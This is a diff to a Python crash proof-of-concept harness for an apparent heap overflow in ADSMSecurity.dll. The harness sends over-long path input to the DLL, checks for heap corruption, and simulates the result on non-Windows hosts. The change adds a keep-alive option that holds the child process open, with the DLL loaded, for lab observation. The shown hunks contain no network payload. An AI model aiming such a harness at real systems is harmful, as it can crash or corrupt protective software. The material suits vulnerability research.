@@ -73,10 +73,22 @@ def is_windows() -> bool:
 
 SIMULATION_MODE = not is_windows()
 
-def simulate_worker(length: int, control: bool, repeat: int):
+def simulate_worker(length: int, control: bool, repeat: int, keep_alive: int = 0):
     """Simulation for non-Windows / CI environments where DLL is not present.
     Mirrors expected behavior without touching real heap.
+    If keep_alive >0, child stays alive holding DLL for that many seconds.
     """
+    def maybe_hold():
+        if keep_alive > 0:
+            sys.stderr.write(f"[worker][SIM] HOLD: keeping child alive with DLL loaded for {keep_alive}s (pid={os.getpid()}) - press Ctrl+C to stop\n")
+            sys.stderr.flush()
+            # sleep in 1s chunks so Ctrl+C is responsive and we log
+            for remaining in range(keep_alive, 0, -1):
+                sys.stderr.write(f"[worker][SIM] HOLD: {remaining}s remaining (DLL still loaded)\n")
+                sys.stderr.flush()
+                time.sleep(1)
+            sys.stderr.write("[worker][SIM] HOLD: done, exiting\n")
+
     if control:
         sys.stderr.write("[worker][SIM] CONTROL: real empty folder, short path\n")
         # simulate creation and removal of empty folder
@@ -84,6 +96,10 @@ def simulate_worker(length: int, control: bool, repeat: int):
         try:
             assert not os.listdir(tmp), "control dir must be empty"
             sys.stderr.write("[worker][SIM] walk returned rc=0; folder removed=True\n")
+            if keep_alive > 0:
+                sys.stderr.write(f"[worker][SIM] CONTROL HOLD: folder removed but child keeps DLL loaded for {keep_alive}s\n")
+                maybe_hold()
+                # cleanup after hold already done
         finally:
             shutil.rmtree(tmp, ignore_errors=True)
         sys.exit(0)
@@ -104,15 +120,32 @@ def simulate_worker(length: int, control: bool, repeat: int):
             # Make it near-certain after few iterations if len >= 261
             if length >= 300 or (length >= 256 and it >= 3):
                 sys.stderr.write(f"[worker][SIM] iteration {it}: HeapValidate 1/3 heaps DAMAGED - F4 corruption confirmed (simulated overflow {overflow} wchars)\n")
+                # if keep_alive requested, hold BEFORE exiting with crash code (lab observation)
+                if keep_alive > 0:
+                    sys.stderr.write(f"[worker][SIM] HOLD requested but heap is corrupted - holding {keep_alive}s before crash exit for observation (pid={os.getpid()})\n")
+                    for remaining in range(keep_alive, 0, -1):
+                        sys.stderr.write(f"[worker][SIM] HOLD: {remaining}s remaining (corrupted heap, DLL loaded)\n")
+                        sys.stderr.flush()
+                        time.sleep(1)
                 sys.exit(EXIT_VALIDATE_FALSE)
             # for 256-299, occasional survival then crash
             if it == repeat:
                 sys.stderr.write(f"[worker][SIM] iteration {it}: HeapValidate 1/3 heaps DAMAGED - F4 corruption confirmed (simulated)\n")
+                if keep_alive > 0:
+                    sys.stderr.write(f"[worker][SIM] HOLD {keep_alive}s before crash exit\n")
+                    time.sleep(keep_alive)
                 sys.exit(EXIT_HEAPCORRUPT if length >= 261 else EXIT_VALIDATE_FALSE)
         # no overflow case
         time.sleep(0.01)
 
     sys.stderr.write(f"[worker][SIM] {repeat} iterations done; last fault: none; heaps intact this run (len={length} < threshold)\n")
+    if keep_alive > 0:
+        sys.stderr.write(f"[worker][SIM] HOLD: keeping child alive with DLL loaded for {keep_alive}s (pid={os.getpid()}) after successful walk\n")
+        for remaining in range(keep_alive, 0, -1):
+            sys.stderr.write(f"[worker][SIM] HOLD: {remaining}s remaining (DLL loaded, heap intact)\n")
+            sys.stderr.flush()
+            time.sleep(1)
+        sys.stderr.write("[worker][SIM] HOLD: done, exiting\n")
     sys.exit(0)
 
 
@@ -128,7 +161,7 @@ def worker(args):
             sys.stderr.write("[worker] Non-Windows host detected -> entering SIMULATION mode\n")
         else:
             sys.stderr.write(f"[worker] DLL not found at {args.dll} -> SIMULATION mode\n")
-        simulate_worker(args.length, args.control, max(1, args.repeat))
+        simulate_worker(args.length, args.control, max(1, args.repeat), getattr(args, 'keep_alive', 0))
         return
 
     # --- REAL WINDOWS WORKER ---
@@ -176,6 +209,16 @@ def worker(args):
             rc = 1
         exists = os.path.isdir(d)
         sys.stderr.write(f"[worker] walk returned rc={rc}; folder removed={not exists}\n")
+        # keep-alive hold before cleanup/exit (lab observation - DLL stays loaded)
+        keep_alive = getattr(args, 'keep_alive', 0)
+        if keep_alive > 0:
+            sys.stderr.write(f"[worker] CONTROL HOLD: keeping child alive with DLL loaded for {keep_alive}s (pid={os.getpid()})\n")
+            sys.stderr.flush()
+            for remaining in range(keep_alive, 0, -1):
+                sys.stderr.write(f"[worker] HOLD: {remaining}s remaining (DLL loaded)\n")
+                sys.stderr.flush()
+                time.sleep(1)
+            sys.stderr.write("[worker] HOLD: done, cleaning up\n")
         # cleanup if still exists
         if exists:
             try:
@@ -257,9 +300,26 @@ def worker(args):
         bad, nh = heaps_damaged()
         if bad:
             sys.stderr.write(f"[worker] iteration {it}: HeapValidate {bad}/{nh} heaps DAMAGED - F4 corruption confirmed\n")
+            keep_alive = getattr(args, 'keep_alive', 0)
+            if keep_alive > 0:
+                sys.stderr.write(f"[worker] HOLD requested but heap corrupted - holding {keep_alive}s before crash exit for observation (pid={os.getpid()})\n")
+                sys.stderr.flush()
+                for remaining in range(keep_alive, 0, -1):
+                    sys.stderr.write(f"[worker] HOLD: {remaining}s remaining (corrupted heap, DLL loaded)\n")
+                    sys.stderr.flush()
+                    time.sleep(1)
             sys.exit(EXIT_VALIDATE_FALSE)
 
     sys.stderr.write(f"[worker] {repeat} iterations done; last fault: {fault or 'none'}; heaps intact this run\n")
+    keep_alive = getattr(args, 'keep_alive', 0)
+    if keep_alive > 0:
+        sys.stderr.write(f"[worker] HOLD: keeping child alive with DLL loaded for {keep_alive}s (pid={os.getpid()}) after walk - heap intact\n")
+        sys.stderr.flush()
+        for remaining in range(keep_alive, 0, -1):
+            sys.stderr.write(f"[worker] HOLD: {remaining}s remaining (DLL loaded, heap intact)\n")
+            sys.stderr.flush()
+            time.sleep(1)
+        sys.stderr.write("[worker] HOLD: done, exiting\n")
     sys.exit(0)
 
 
@@ -273,7 +333,8 @@ def sustain(args):
     duration = args.duration
     child_argv = [sys.executable, os.path.abspath(__file__),
                   "--worker", "--len", str(length), "--dll", args.dll,
-                  "--repeat", str(args.repeat)]
+                  "--repeat", str(args.repeat),
+                  "--keep-alive", str(getattr(args, 'keep_alive', 0))]
     start = time.time()
     crashes = 0
     survived = 0
@@ -357,6 +418,12 @@ def main():
                     help="internal: iterations per child (default 30)")
     ap.add_argument("--attempts", type=int, default=1,
                     help="how many times to fire the input (default 1)")
+    ap.add_argument("--keep-alive", dest="keep_alive", type=int, default=0,
+                    help="keep child alive holding DLL for N seconds after walk (lab observation, default 0 = exit immediately)")
+    ap.add_argument("--hold", dest="keep_alive", type=int,
+                    help="alias for --keep-alive")
+    ap.add_argument("--hold-time", dest="keep_alive", type=int,
+                    help="alias for --keep-alive")
     args = ap.parse_args()
 
     if args.worker:
@@ -380,12 +447,14 @@ def main():
     if args.control:
         mode = "CONTROL - normal path (empty folder), no overflow input"
         child_argv = [sys.executable, os.path.abspath(__file__),
-                      "--worker", "--control", "--dll", args.dll]
+                      "--worker", "--control", "--dll", args.dll,
+                      "--keep-alive", str(getattr(args, 'keep_alive', 0))]
     else:
         mode = f"OVERFLOW INPUT - {args.length} characters"
         child_argv = [sys.executable, os.path.abspath(__file__),
                       "--worker", "--len", str(args.length), "--dll", args.dll,
-                      "--repeat", str(args.repeat)]
+                      "--repeat", str(args.repeat),
+                      "--keep-alive", str(getattr(args, 'keep_alive', 0))]
 
     print("=" * 78)
     print("F4 crash PoC - ADSMSecurity.dll sub_0x7410+0x74a4")
